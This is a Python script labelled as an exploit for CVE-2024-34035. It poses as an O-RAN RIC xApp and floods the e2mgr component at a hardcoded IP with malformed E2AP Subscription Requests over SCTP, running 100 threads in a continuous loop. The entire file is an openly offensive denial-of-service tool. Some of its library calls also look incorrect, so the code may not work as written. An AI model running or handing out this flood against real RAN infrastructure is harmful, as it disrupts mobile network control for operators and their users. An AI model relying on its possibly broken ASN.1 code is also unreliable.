#!/usr/bin/env python3

import argparse
import json
import signal
import time
import threading
from ricxappframe.xapp_frame import Xapp
from pycrate_asn1dir import E2AP
from pycrate_asn1rt.utils import *
import socket
import sctp

class E2FloodXapp(Xapp):
    def __init__(self):
        super().__init__(entrypoint=self._dummy_entrypoint, rmr_port=4561)
        self._shutdown = False
        self._target_ip = "10.0.2.11"  # e2mgr IP
        self._target_port = 36422      # E2AP SCTP port
        self._lock = threading.Lock()
        self._count = 0

    def _dummy_entrypoint(self, xapp_instance):
        """Framework-compliant entrypoint"""
        pass

    def _create_malicious_subscription(self, e2_node_id):
        """ASN.1 encoded E2AP Subscription Request"""
        pdu = E2AP.E2AP_PDU_Descriptions.InitiatingMessage(
            procedureCode=E2AP.ProcedureCode_id_subscription,
            criticality=E2AP.Criticality_reject,
            value=E2AP.SubscriptionRequest(
                requestId=1,
                eventTriggerDefinition=b'\x00',  # Null trigger
                actionDefinitions=E2AP.ActionDefinitionsList([
                    E2AP.ActionDefinition(
                        ricActionId=99999,
                        ricActionType=E2AP.RICactionType_report,
                        ricActionDefinition=b''
                    )
                ])
            )
        )
        return pdu.to_aper()

    def _burst_attack(self, e2_node_id, count=1000):
        """High-intensity SCTP flood"""
        sock = sctp.sctpsocket_tcp(socket.AF_INET)
        sock.connect((self._target_ip, self._target_port))
        
        payload = self._create_malicious_subscription(e2_node_id)
        for _ in range(count):
            try:
                sock.sctp_send(payload)
                with self._lock:
                    self._count += 1
            except Exception as e:
                print(f"Send error: {str(e)}")
        sock.close()

    def _sustained_attack(self, e2_node_id):
        """Maintain maximum pressure on e2mgr"""
        while not self._shutdown:
            workers = []
            for _ in range(100):  # 100 concurrent threads
                t = threading.Thread(
                    target=self._burst_attack,
                    args=(e2_node_id, 1000)
                )
                workers.append(t)
                t.start()
            
            for t in workers:
                t.join()
            
            print(f"Total validated requests: {self._count}")
            time.sleep(0.01)  # Minimal delay between bursts

    def signal_handler(self, sig, frame):
        print("\nTerminating attack...")
        self._shutdown = True
        super().stop()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='CVE-2024-34035 Exploit')
    parser.add_argument('--e2-node', required=True, help='Target E2 Node ID')
    args = parser.parse_args()

    xapp = E2FloodXapp()
    signal.signal(signal.SIGINT, xapp.signal_handler)
    
    try:
        attack_thread = threading.Thread(
            target=xapp._sustained_attack,
            args=(args.e2_node,)
        )
        attack_thread.start()
        xapp.run()
    except KeyboardInterrupt:
        xapp.signal_handler(None, None)
